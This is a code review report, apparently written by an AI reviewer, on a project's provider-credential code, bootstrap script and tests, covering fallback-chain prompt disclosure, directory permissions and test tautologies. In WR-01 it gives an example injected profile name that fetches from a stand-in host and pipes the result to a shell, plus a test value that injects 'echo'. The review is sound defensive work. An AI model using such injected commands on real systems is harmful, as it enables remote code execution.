---
phase: 03-providers-credentials
reviewed: 2026-08-14T00:00:00Z
depth: standard
files_reviewed: 27
files_reviewed_list:
  - .env.example
  - .pi/extensions/providers/fallback.ts
  - .pi/extensions/providers/index.ts
  - .pi/extensions/providers/schema.ts
  - .pi/extensions/providers/sso.ts
  - .pi/templates/auth-template.json
  - .pi/templates/env.example
  - .pi/templates/models-template.json
  - bin/bootstrap.sh
  - docs/RUNBOOK.md
  - tests/helpers/faux.ts
  - tests/helpers/loopback.ts
  - tests/helpers/models.ts
  - tests/integration/dashscope-payload.test.ts
  - tests/integration/fallback-chain.test.ts
  - tests/integration/sso-classifier.test.ts
  - tests/integration/templates-install.test.ts
  - tests/unit/bedrock-auth.test.ts
  - tests/unit/command-interpolation.test.ts
  - tests/unit/dashscope-compat.test.ts
  - tests/unit/docs-policy.test.ts
  - tests/unit/helpers.test.ts
  - tests/unit/jsonl-rotation.test.ts
  - tests/unit/lf-and-shell.test.ts
  - tests/unit/model-metadata.test.ts
  - tests/unit/r1-unclamp.test.ts
  - tests/unit/template-tracked.test.ts
findings:
  critical: 3
  warning: 8
  info: 6
  total: 17
status: issues_found
---

# Phase 3: Code Review Report

**Reviewed:** 2026-08-14
**Depth:** standard
**Files Reviewed:** 27
**Status:** issues_found

## Summary

This phase is unusually well defended against the failure class the project cares
most about. The tautology hunt came back mostly empty: `dashscope-payload.test.ts`
pairs every absence assertion with a falsifying control (case 3, case 6, case 7),
`fallback-chain.test.ts` runs its fatal control in the same session as the three
advancing classes, `sso-classifier.test.ts` carries a live retryable oracle, and
`command-interpolation.test.ts` proves its own forbidden-pattern set against an
inline offending fixture. The second-turn / tool-result round trip that PROV-10 is
actually about **is** covered (`dashscope-payload.test.ts` cases 5–7), on real
bytes, with both the compat-key and the `reasoning:true` controls. Egress is
genuinely closed: `pi-ai@0.84.1` ships **no** built-in `dashscope` provider
(verified against `dist/providers/data/`), the one built-in provider the chain
names (`deepseek`, real `baseUrl: https://api.deepseek.com`) is guarded by
`fallback-chain.test.ts` case 1's faux-`api`-id assertion, and every completion in
`dashscope-payload.test.ts` passes `assertLoopbackUrl(model.baseUrl)` on the
*composed* URL before it is issued.

The defects are elsewhere, and they cluster in the two places nobody wrote a test
for: **what `bin/bootstrap.sh` does to a real machine**, and **the one token in
`QUOTA_PATTERN` whose consequence was inverted when it was copied from Pi**.

Three findings are blocking. All three are provable from source, and all three
survive the current suite green.

## Critical Issues

### CR-01: The installed Bedrock placeholder shadows a working `AWS_PROFILE`, and the SSO classifier accepts it as a real profile name

**File:** `.pi/templates/auth-template.json:4`, `bin/bootstrap.sh:634-693`, `.pi/extensions/providers/schema.ts:133`, `.pi/extensions/providers/index.ts:144-194`

**Issue:** The template ships

```json
"amazon-bedrock": { "type": "api_key", "env": { "AWS_PROFILE": "REPLACE_WITH_AWS_PROFILE_NAME" } }
```

and `merge_auth_json` installs it verbatim whenever `~/.pi/agent/auth.json` has no
`amazon-bedrock` key. Pi's Bedrock resolver prefers the *stored* value over the
ambient one:

```
pi-ai 0.84.1 src/providers/amazon-bedrock.ts:65
    if (credential?.env?.AWS_PROFILE ?? (await env("AWS_PROFILE"))) { ... }
pi-ai 0.84.1 dist/api/bedrock-converse-stream.js:44
    const optionsProfile = options.profile || options.env?.AWS_PROFILE;
```

Two consequences, both silent:

1. **Bedrock regression on a working machine.** Concrete: on a laptop where
   `AWS_PROFILE=work` is exported and Bedrock works today, run
   `sh bin/bootstrap.sh`. `merge_auth_json` writes the placeholder, the placeholder
   now wins the `??`, and every Bedrock request resolves profile
   `REPLACE_WITH_AWS_PROFILE_NAME`. `docs/RUNBOOK.md` RB-03-03 step 1 literally
   tells the operator to check `echo $AWS_PROFILE` — i.e. the exact state this
   breaks.
2. **PROV-05 emits a bogus command.** `SAFE_PROFILE_NAME = /^[^\s]{1,64}$/` matches
   `REPLACE_WITH_AWS_PROFILE_NAME` (29 chars, no whitespace), so
   `usableProfileName` returns it, `resolveProfileName` never reaches
   `PROFILE_PLACEHOLDER`, and `PROFILE_PLACEHOLDER_HINT` never fires. The surfaced
   line reads `AWS SSO credentials are expired or missing. Run: aws sso login
   --profile REPLACE_WITH_AWS_PROFILE_NAME` — a copy-pasteable command that cannot
   work, with the RB-03-03 pointer suppressed. That is precisely the state
   `PROFILE_PLACEHOLDER` exists to make visible.

No test covers either. `tests/integration/templates-install.test.ts:265-270` only
checks the installed key *set*; `tests/unit/bedrock-auth.test.ts:180-185` asserts
the resolved value equals `templatePlaceholder()` — both sides read the same file
(see WR-08), so the placeholder's *content* is asserted nowhere.

**Fix:** Treat the placeholder as a sentinel in both places. In
`.pi/extensions/providers/schema.ts`:

```ts
/** The literal `.pi/templates/auth-template.json` ships, which is NOT a profile. */
export const PROFILE_TEMPLATE_SENTINEL = "REPLACE_WITH_AWS_PROFILE_NAME";
```

and in `.pi/extensions/providers/index.ts`:

```ts
function usableProfileName(value: string | undefined): string | undefined {
	if (value === undefined) return undefined;
	const trimmed = value.trim();
	if (trimmed === PROFILE_TEMPLATE_SENTINEL) return undefined; // unedited template
	return SAFE_PROFILE_NAME.test(trimmed) ? trimmed : undefined;
}
```

And stop shadowing the ambient variable: either omit the `amazon-bedrock` entry
from the template entirely (Pi's ambient branch then works, and `pi auth login`
writes the real one), or have `merge_auth_json` skip any template entry whose
values still carry a `REPLACE_WITH_` sentinel. Add a case to
`templates-install.test.ts` that exports `AWS_PROFILE=kypi-fixture-ambient`, runs
bootstrap, and asserts `getProviderAuth("amazon-bedrock").env.AWS_PROFILE` is
still `kypi-fixture-ambient`.

---

### CR-02: `bin/bootstrap.sh` creates `~/.pi/agent` and `auth.json` with looser modes than Pi would, and Pi never tightens them

**File:** `bin/bootstrap.sh:441-442`, `:564`, `:640`, `:690`

**Issue:** `merge_settings`, `merge_models_json` and `merge_auth_json` each run
`mkdir -p "$PI_AGENT_DIR"` (default `0777 & ~umask`, i.e. `0755`), and
`merge_auth_json`'s `fs.writeFileSync(dst, ...)` creates `auth.json` with
`0666 & ~umask`, i.e. `0644`.

Pi's own storage creates both far more tightly — but only when they are absent:

```
pi 0.84.1 dist/core/auth-storage.js:21-31
    ensureParentDir()  { if (!existsSync(dir)) mkdirSync(dir, { recursive: true, mode: 0o700 }); }
    ensureFileExists() { if (!existsSync(this.authPath)) { writeFileSync(..., { mode: 0o600 }); chmodSync(..., 0o600); } }
```

Because bootstrap gets there first, both existence guards short-circuit. Pi does
`chmodSync(0o600)` on every *write* to `auth.json`, so the file is repaired on the
first `pi auth login` — but **the directory mode is never repaired at all** and
stays `0755` for the life of the machine. `~/.pi/agent/` holds `auth.json`,
`models.json` and Pi's session transcripts (which the project's own `.gitignore`
comment describes as able to "contain source code, prompts and secrets").

Concrete on the macOS target and on the ubuntu CI leg:
`sh bin/bootstrap.sh && stat -c %a ~/.pi/agent ~/.pi/agent/auth.json` prints
`755` / `644` where a Pi-created pair prints `700` / `600`. Any other local
account can list and read the directory.

The in-file comment at `:556` ("NOTHING HERE WRITES A SECRET ... which is why the
file mode is not this script's business") is the reasoning error: the script does
not write a secret, but it *creates the container the secrets will live in*, and
by doing so it disables Pi's control.

**Fix:** Match Pi's modes at every creation site.

```sh
ensure_agent_dir() {
	# Pi creates this 0700 (auth-storage.js:23) but only when it is ABSENT, so
	# creating it here at 0755 permanently defeats that control.
	mkdir -p "$PI_AGENT_DIR"
	chmod 700 "$PI_AGENT_DIR" 2>/dev/null || true   # no-op on Windows, per RB notes
}
```

Call it in place of every `mkdir -p "$PI_AGENT_DIR"`, and in `merge_auth_json`
create the file with an explicit mode:

```js
fs.writeFileSync(dst, JSON.stringify(obj, null, 2) + "\n", { encoding: "utf8", mode: 0o600 });
try { fs.chmodSync(dst, 0o600); } catch { /* Windows: toggles the read-only bit only */ }
```

Add a POSIX-only case to `templates-install.test.ts` asserting
`statSync(agentDir).mode & 0o777 === 0o700`.

---

### CR-03: `QUOTA_PATTERN`'s bare `billing` token advances the fallback chain on non-quota failures, disclosing the full prompt to a second vendor

**File:** `.pi/extensions/providers/schema.ts:358-359`, `.pi/extensions/providers/fallback.ts:196-204`

**Issue:**

```ts
export const QUOTA_PATTERN =
	/insufficient_quota|out of budget|quota exceeded|billing|arrearage|allocated quota/i;
```

and `classifyFailure` checks it **first**, deliberately ahead of Pi's own
retryable/fatal predicate:

```ts
if (QUOTA_PATTERN.test(errorText)) return "quota";      // advances the chain
if (!isRetryableAssistantError(retryProbe(errorText))) return "fatal";  // stops it
```

The first four alternatives were transcribed from Pi's
`NON_RETRYABLE_PROVIDER_LIMIT_ERROR_PATTERN` (verified at
`pi-ai 0.84.1 src/utils/retry.ts:7-24` — `insufficient_quota`, `out of budget`,
`quota exceeded`, `billing`). **But the consequence was inverted in the copy.** In
Pi, matching that table means "do not retry" — the conservative direction, and a
match costs nothing. Here, matching means "send this user's prompt, system prompt
and tool schemas to a different vendor" — the direction the plan's own threat
register rates highest (T-03-10-01, T-03-10-02). A token loose enough to be safe
in Pi is not loose enough to be safe here.

`billing` is an unanchored six-letter substring. Provider error bodies routinely
carry billing URLs and billing prose on failures that are not quota failures at
all. Concrete, and green under the current suite:

```ts
classifyFailure(
  "Error code: 400 - {'error': {'message': 'Invalid request: unsupported parameter " +
  "reasoning_effort. See https://platform.example.com/billing for plan limits.'}}"
) === "quota"   // → callWithFallback dials hop 2 with the whole prompt
```

The same applies to a 401/403 phrased as "your account is not enabled for
billing". `fallback-chain.test.ts` case 3 does not catch it because
`CLASS_FIXTURES.fatal.text` contains no billing wording — the control is correct
about the string it holds and silent about the whole class next to it.

**Fix:** Anchor the borrowed tokens to quota/limit wording rather than to a bare
noun, and keep the local DashScope additions (which are already specific):

```ts
export const QUOTA_PATTERN =
	/insufficient_quota|out of budget|quota exceeded|allocated quota|arrearage|billing (?:details|quota|limit)|exceeded your current quota/i;
```

Then add the missing control to `fallback-chain.test.ts` case 3 — a *second* fatal
fixture that merely mentions billing:

```ts
expect(
	classifyFailure(
		"Error code: 400 - {'error': {'message': 'Invalid request; see /billing for limits'}}",
	),
	"a malformed request that merely links a billing page must stay fatal: advancing " +
		"forwards the whole prompt to a second vendor to be rejected a second time",
).toBe("fatal");
```

## Warnings

### WR-01: `SAFE_PROFILE_NAME` permits shell metacharacters in a string the user is told to paste into a shell

**File:** `.pi/extensions/providers/schema.ts:133`, `.pi/extensions/providers/index.ts:248`

**Issue:** `/^[^\s]{1,64}$/` accepts `;`, `|`, `&`, backticks, `$(`, `>` — anything
without whitespace. The value is interpolated straight into
`aws sso login --profile ${profile}` and surfaced as an instruction. A profile
name of `x;curl${IFS}evil.example/s|sh` (no whitespace, 30 chars) passes the
bound and produces a message the user is being trained to copy-paste. The source
is `auth.json` or the ambient environment, so this is not remote input — but the
whole harness posture is "assume a laptop with live AWS SSO credentials", and the
bound is free to tighten.

The docstring's stated residual ("a profile literally named `timeout`") also
understates Pi's retryable set: `RETRYABLE_PROVIDER_ERROR_PATTERN`
(`pi-ai src/utils/retry.ts:26-89`) additionally carries `terminated`, `429`,
`500`, `502`, `503`, `504`, `retry delay`, `server.?error` and `internal.?error`,
so a profile named `svc-500` or `terminated-old` re-admits the rewritten message
to the retry loop too.

**Fix:** Use AWS's own profile-name charset, which excludes every metacharacter
and every one of Pi's retryable tokens' punctuation:

```ts
/**
 * AWS profile names are `[-_.@A-Za-z0-9]` identifiers. Bounding to that charset
 * (rather than to "no whitespace") removes the shell-metacharacter class from a
 * string the user is instructed to paste into a shell.
 */
export const SAFE_PROFILE_NAME = /^[A-Za-z0-9_.@-]{1,64}$/;
```

Add a table case to `sso-classifier.test.ts` driving `AWS_PROFILE="x;echo pwned"`
and asserting the message falls back to `PROFILE_PLACEHOLDER`.

---

### WR-02: The committed-template secret scan only reads the `dashscope` sub-object of `models-template.json`

**File:** `tests/integration/templates-install.test.ts:584-587`, `:613-635`

**Issue:**

```ts
const parsed = [
	[".pi/templates/models-template.json", stringValues(templateDashscope())],
	[".pi/templates/auth-template.json",   stringValues(readJson(AUTH_TEMPLATE))],
];
```

`templateDashscope()` returns `parsed.providers.dashscope` only. The value-level
checks (`\bsk-`, `AKIA`, leading `!`) therefore never see anything outside that one
key. The text-level scan (`TOKEN_SHAPED`) covers the whole file but requires a
**40+ character** run and additionally excludes any pure-alphabetic run of any
length (`isStructuralRun`).

Concrete evasion, green under the current suite: add a second provider to the
template with a short key.

```jsonc
"providers": {
  "dashscope": { ... },
  "scratch":   { "apiKey": "sk-abc123def456" }   // 14 chars: under TOKEN_SHAPED's floor,
}                                                 // and outside the value scan entirely
```

Neither check fires. The same hole swallows a `!command` value placed under any
non-`dashscope` provider — which `tests/unit/command-interpolation.test.ts` *does*
catch (it walks all leaves), so the two scans disagree about their own scope.

**Fix:** Scan the whole parsed document, not one key.

```ts
const parsed: ReadonlyArray<readonly [string, string[]]> = [
	[".pi/templates/models-template.json", stringValues(parseModelsTemplate(readFileSync(MODELS_TEMPLATE, "utf-8")))],
	[".pi/templates/auth-template.json",   stringValues(readJson(AUTH_TEMPLATE))],
];
```

and add a paired negative proving the wider walk still fires — e.g. a fixture with
`providers.other.apiKey = "sk-…"` that the scan must report.

---

### WR-03: Two fixture tables can be emptied to disarm their only guard

**File:** `tests/integration/fallback-chain.test.ts:750-757`, `tests/integration/sso-classifier.test.ts:539-553`

**Issue:** Both loops iterate an imported table with no non-empty precondition:

```ts
for (const quotaFixture of DASHSCOPE_QUOTA_FIXTURES) { expect(classifyFailure(...)).toBe("quota"); }
for (const entry of SSO_PATTERNS) for (const fixture of NON_SSO_FIXTURES) { ... }
```

`DASHSCOPE_QUOTA_FIXTURES` has exactly one consumer in the repository (verified by
grep). Deleting both of its entries in `.pi/extensions/providers/schema.ts:436-447`
makes case 8's first loop iterate nothing, drops the *entire* proof that
DashScope's `Arrearage` / `Allocated quota exceeded` wording is handled at all,
and leaves the suite **greener than before** — the exact shape
`docs-policy.test.ts:406-435` was written to close for `ALL_IDS`.

`NON_SSO_FIXTURES` is partially protected (`RETRYABLE_CONTROL_FIXTURE` indexes
`[0]`), but truncating it to just `[0]` silently removes the throttling and 400
fixtures from the exclusion rule with nothing red.

**Fix:** Apply the file's own established pattern (`SSO_PATTERNS.length >= 5` at
`sso-classifier.test.ts:533-537`) to both tables:

```ts
expect(
	DASHSCOPE_QUOTA_FIXTURES.length,
	"the DashScope quota table is the only reason QUOTA_PATTERN carries wording Pi's " +
		"limit table does not. Shrinking it removes coverage without turning anything red",
).toBeGreaterThanOrEqual(2);

expect(
	NON_SSO_FIXTURES.length,
	"the exclusion rule is asserted over this set; an emptied or truncated one makes " +
		"`overreaching` trivially [] for every pattern",
).toBeGreaterThanOrEqual(3);
```

---

### WR-04: `expect(ssoRuns.length).toBe(SSO_FIXTURES.length)` is tautological

**File:** `tests/integration/sso-classifier.test.ts:276-279`

**Issue:** `ssoRuns` is built by `for (const fixture of SSO_FIXTURES) ssoRuns.push(...)`
at `:250-255`. The lengths are two views of the same iteration and can only differ
if `beforeAll` threw — in which case the whole file is already red. The stated
purpose ("no SSO fixture was driven at all, so the whole file asserts nothing")
cannot be achieved by this comparison. Emptying `SSO_FIXTURES` gives `0 === 0`;
only the unrelated `SSO_FIXTURES[0].text` at `:261` saves it, by accident.

**Fix:** Assert against a floor, not against the source of the loop:

```ts
expect(
	ssoRuns.length,
	"the six credential fixtures PROV-05 is written against must each be driven; " +
		"comparing against SSO_FIXTURES.length compares the loop with itself",
).toBeGreaterThanOrEqual(6);
```

---

### WR-05: The SSO handler rewrites any provider's error, not just Bedrock's

**File:** `.pi/extensions/providers/index.ts:203-268`

**Issue:** The `message_end` handler gates on `role === "assistant"`,
`stopReason === "error"` and a non-empty `errorMessage`, then runs `classifySso`
on the text — with no check on which provider produced the message.
`AssistantMessage` carries `provider` (pi-ai `dist/types.d.ts`), and the file
already imports `BEDROCK_PROVIDER_ID` for the auth lookup.

Concrete: DashScope returns an error whose body quotes an upstream
`CredentialsProviderError` or contains the phrase `SSO session` (matched by
`/\bSSO[\s]{1,4}session\b/i`). The handler replaces the whole message with
`AWS SSO credentials are expired or missing. Run: aws sso login --profile …`, and
— per the deliberate Trap-T4 design — **discards the original text from
`errorMessage`**. The user is now told to re-authenticate to AWS because DeepSeek
or DashScope failed, and the real message survives only on `diagnostics[]`, which
nothing renders.

A related edge: when the user authenticates via `AWS_BEARER_TOKEN_BEDROCK` (Pi's
branch at `amazon-bedrock.ts:64`, which returns no `env`), there is no profile at
all, yet an expired bearer token still produces an `ExpiredTokenException` and the
handler prescribes `aws sso login --profile <profile>`.

**Fix:** One line, before the classify call:

```ts
// Only Bedrock reaches the AWS credential chain in this harness, and the remedy
// this handler prescribes is meaningless for any other vendor's error text.
if (message.provider !== BEDROCK_PROVIDER_ID) {
	return;
}
```

Add the paired negative to `sso-classifier.test.ts`: drive an SSO fixture through
a faux provider whose id is not `amazon-bedrock` and assert the message survives
byte-identical.

---

### WR-06: `write_env_template` corrupts `.env.example` when the managed markers are out of order

**File:** `bin/bootstrap.sh:500-511`

**Issue:**

```js
const ds = cur.indexOf(START);
const de = cur.indexOf(END);
if (ds >= 0 && de >= 0) {
  out = cur.slice(0, ds) + block.replace(/\n$/, "") + cur.slice(de + END.length);
}
```

`ds` and `de` are only tested for presence, never for ordering. If a user edits
`.env.example` so that `# ky-pi-agent managed:end` appears *above*
`# ky-pi-agent managed:start` (a plausible outcome of a manual merge or a
copy-paste), then `de < ds` and the two slices overlap: `cur.slice(0, ds)`
includes the END marker, and `cur.slice(de + END.length)` includes the START
marker plus everything after it. The result is a file with duplicated content and
duplicated markers, and it is **not idempotent** — each subsequent bootstrap run
grows it further. This is a tracked file in a public repo.

**Fix:**

```js
if (ds >= 0 && de > ds) {
  out = cur.slice(0, ds) + block.replace(/\n$/, "") + cur.slice(de + END.length);
} else if (ds >= 0 || de >= 0) {
  console.error("FATAL: " + dst + " has managed markers that are absent or out of order.");
  console.error("       Refusing to rewrite it: fix the markers by hand, or delete the file.");
  process.exit(1);
} else {
  out = cur.replace(/\n*$/, "\n") + "\n" + block;
}
```

---

### WR-07: `KYPI_DASHSCOPE_BASE_URL` is written into `models.json` with no validation

**File:** `bin/bootstrap.sh:601-602`

**Issue:**

```js
const override = process.env.KYPI_DASHSCOPE_BASE_URL;
if (override) { next.baseUrl = override; }
```

No scheme check, no URL parse. `docs/RUNBOOK.md` RB-03-01 makes setting this the
first documented remedy, with a copy-paste one-liner, so operators will type it
under pressure. A value that lands as `http://…` (a typo, or a copied internal
gateway) means Pi sends the resolved `$DASHSCOPE_API_KEY` as a cleartext
`Authorization: Bearer` header on every request — with no signal anywhere, because
`baseUrl` is never interpolated and never validated by Pi either
(`provider-composer.ts:142`). A value that is not a URL at all fails much later,
inside the adapter, as an opaque fetch error.

**Fix:**

```js
const override = process.env.KYPI_DASHSCOPE_BASE_URL;
if (override) {
  let parsed;
  try { parsed = new URL(override); } catch {
    console.error("FATAL: KYPI_DASHSCOPE_BASE_URL is not a parseable absolute URL: " + override);
    process.exit(1);
  }
  if (parsed.protocol !== "https:") {
    console.error("FATAL: KYPI_DASHSCOPE_BASE_URL must be https. Pi sends the resolved");
    console.error("       $DASHSCOPE_API_KEY as a bearer token on every request, so an");
    console.error("       http:// endpoint puts the key on the wire in cleartext.");
    process.exit(1);
  }
  next.baseUrl = override;
}
```

Note `tests/integration/templates-install.test.ts:414` currently passes
`http://127.0.0.1:9/compatible-mode/v1`; that case needs an
`https://127.0.0.1:9/...` value (or an explicit loopback exemption) alongside a
new case asserting the `http://` refusal.

---

### WR-08: `bedrock-auth.test.ts` case 1 asserts the profile against the same file it fed in

**File:** `tests/unit/bedrock-auth.test.ts:180-185`

**Issue:** The test passes `authTemplate()` as the credential store and then
asserts the resolved value equals `templatePlaceholder()`, which re-reads the same
`auth-template.json`. Both sides derive from one source, so the assertion is
"whatever the template says, Pi echoed it back" — true for *any* placeholder,
including the one that causes CR-01. That is why the placeholder hazard is
unnoticed by an otherwise very careful file: case 5 asserts the placeholder is
non-empty, and nothing asserts anything else about it.

It does prove one real property (Pi returns `credential.env` verbatim on that
branch), so it is not vacuous — but it is not the assertion the file needs.

**Fix:** Keep the round-trip assertion and add the property-level one:

```ts
const placeholder = templatePlaceholder();
expect(
	typeof placeholder === "string" && /^REPLACE_WITH_/.test(placeholder),
	"the shipped placeholder must be recognisably a placeholder, because it WINS over " +
		"the ambient AWS_PROFILE (amazon-bedrock.ts:65). A value that merely looks like a " +
		"profile name silently breaks Bedrock on a machine where it already worked, and " +
		"the SSO classifier will interpolate it into a copy-pasteable command",
).toBe(true);
```

## Info

### IN-01: `QODER_PERSONAL_ACCESS_TOKEN` is advertised for a vendor this phase rules out entirely

**File:** `.env.example:22`, `.pi/templates/env.example:22`

**Issue:** `.pi/templates/models-template.json:31-33` states that the out-of-scope
vendor's name is greped to zero in that file because 03-CONTEXT decision 8 rules
it out of v1 ("it publishes no inference endpoint at all"), and
`.pi/extensions/providers/schema.ts:290-296` repeats the rule for the chain. Yet
both env templates ship `QODER_PERSONAL_ACCESS_TOKEN=`, inviting the operator to
mint and store a personal access token for a vendor nothing in the harness can
call. `docs/RUNBOOK.md` never mentions it.

**Fix:** Remove the line from `.pi/templates/env.example` (bootstrap will
regenerate `.env.example`), or add a one-line comment inside the managed block
naming the phase that will use it.

---

### IN-02: `.npmrc.kypi-backup` is a durable copy of a file the script says may hold `_authToken`

**File:** `bin/bootstrap.sh:372-380`

**Issue:** The repair branch does `cp "$_rc_file" "$_rc_file.kypi-backup"` and
never removes it. The comment at `:338-340` explicitly says the file may contain
"a private registry, a proxy or a `//registry.internal/:_authToken`". The backup
is announced on stdout, so it is not silent, but it persists indefinitely and is
overwritten (not rotated) by later repairs, so a second repair destroys the first
backup while leaving a credential copy on disk.

**Fix:** Remove the backup on success, or write it into a mode-`0600` file and
print a one-line reminder to delete it.

---

### IN-03: Dead round-trip in the env-template block builder

**File:** `bin/bootstrap.sh:497`, `:507`

**Issue:** `const block = src.slice(s, e + END.length) + "\n";` followed by
`block.replace(/\n$/, "")` at the only marker-replacement site. The append and the
strip cancel exactly; the appended newline is used only on the marker-absent path
at `:509`. Harmless, but it reads as if trailing-newline handling differs between
the two paths when it does not.

**Fix:** Build `block` without the newline and add it explicitly at `:509`.

---

### IN-04: Two docstrings claim the fallback classes are distinguished by HTTP status; they are distinguished by text

**File:** `tests/helpers/faux.ts:66-73`, `tests/unit/helpers.test.ts:496-500`

**Issue:** Both state that PROV-08's "three error classes (quota, transient,
unavailable) are distinguished by HTTP status" and that a missing status wrapper
would "collapse quota, transient and unavailable into one indistinguishable case".
`classifyFailure` (`.pi/extensions/providers/fallback.ts:196-204`) reads
`errorText` only and never sees a status; `CLASS_STATUS` in
`fallback-chain.test.ts:137-142` is used solely to populate the `httpStatus`
column of the turns row asserted in case 5. `wrapFauxWithStatus` is genuinely
needed — for the turns-row assertion — but not for the reason both docstrings
give. A future reader looking for the status→class mapping will not find one.

**Fix:** Reword to "the three classes are distinguished by the provider's error
TEXT; the wrapper exists so the turns row carries the status the provider
reported, which is what case 5 asserts."

---

### IN-05: `withLoopbackCompletions` abandons the server when `listen` fails

**File:** `tests/helpers/loopback.ts:310-333`

**Issue:** The bind promise's `.catch` rethrows before the `try` block at `:350`,
so on a bind failure the `finally` never runs and neither `server.close()` nor the
`connection` listener teardown happens. In practice the server never bound, so
nothing leaks a port — but the object and its listener survive, and the original
error is flattened into a message string with no `cause`, so the underlying
`EACCES`/`EADDRINUSE` code is lost from the stack.

**Fix:** `throw new Error(msg, { cause: error })` and call `server.close()` in the
catch before rethrowing.

---

### IN-06: `fallback-chain.test.ts` case 1 passes over an empty run map

**File:** `tests/integration/fallback-chain.test.ts:472-485`

**Issue:** `for (const name of Object.keys(fixture.runs))` iterates nothing when
the probe failed to hand over an `ExtensionContext`, so the "every hop resolved
THIS fixture's faux provider, not the real catalogue" case reports green in
exactly the scenario where it matters. Case 0 goes red in that situation, so
something in the file does fail — but the identity guard itself is not
self-guarding.

**Fix:** Prepend the file's own house rule:

```ts
expect(
	Object.keys(fixture.runs).length,
	"no chain walk was recorded, so the identity guard below iterates nothing",
).toBeGreaterThanOrEqual(5);
```

---

_Reviewed: 2026-08-14_
_Reviewer: Claude (gsd-code-reviewer)_
_Depth: standard_
